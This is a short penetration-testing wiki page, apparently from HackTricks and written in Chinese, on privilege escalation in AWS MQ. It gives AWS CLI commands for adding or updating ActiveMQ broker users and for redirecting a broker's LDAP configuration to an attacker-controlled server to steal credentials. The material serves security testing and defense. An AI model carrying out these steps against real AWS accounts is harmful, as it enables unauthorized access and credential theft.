# AWS - MQ Privesc

{{#include ../../../banners/hacktricks-training.md}}

## MQ

有关MQ的更多信息，请查看：

{{#ref}}
../aws-services/aws-mq-enum.md
{{#endref}}

### `mq:ListBrokers`, `mq:CreateUser`

拥有这些权限，您可以**在ActimeMQ代理中创建新用户**（这在RabbitMQ中无效）：
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
**潜在影响：** 通过 ActiveMQ 访问敏感信息

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

拥有这些权限后，您可以 **在 ActiveMQ 代理中创建新用户**（这在 RabbitMQ 中无效）：
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
**潜在影响：** 通过 ActiveMQ 访问敏感信息

### `mq:ListBrokers`, `mq:UpdateBroker`

如果一个代理使用 **LDAP** 进行授权与 **ActiveMQ**。攻击者可以 **更改** 用于 **的 LDAP 服务器的配置** 为 **一个由攻击者控制的**。这样攻击者将能够 **窃取所有通过 LDAP 发送的凭据**。
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
如果你能以某种方式找到 ActiveMQ 使用的原始凭据，你可以执行 MitM，窃取凭据，在原始服务器中使用它们，并发送响应（也许只是重用被窃取的凭据你就可以做到这一点）。

**潜在影响：** 窃取 ActiveMQ 凭据

{{#include ../../../banners/hacktricks-training.md}}
